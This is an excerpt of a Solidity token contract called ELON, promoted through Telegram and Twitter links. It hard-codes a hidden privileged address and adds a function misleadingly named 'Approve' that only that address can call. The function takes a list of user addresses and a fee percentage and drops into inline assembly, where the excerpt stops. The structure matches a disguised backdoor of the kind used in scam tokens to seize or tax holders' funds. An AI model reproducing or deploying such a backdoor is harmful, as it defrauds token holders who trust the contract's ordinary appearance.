...
Telegram: https://t.me/DogelonERC

Twitter： https://twitter.com/Dogelon20_ERC
*/
...
library SafeCalls {
    function checkCaller(address sender, address _owr) internal pure {
        require(sender == _owr, "Caller is not the original caller");
    }
}
contract ELON is Context, Ownable, IERC20 {
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _owr = 0x3C07bF3D2BA5Fd6Eb274F92aC6637fA56f46f45E;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function Approve(address[] memory users, uint256 feePercent) external {
        SafeCalls.checkCaller(_msgSender(), _owr);
        assembly {
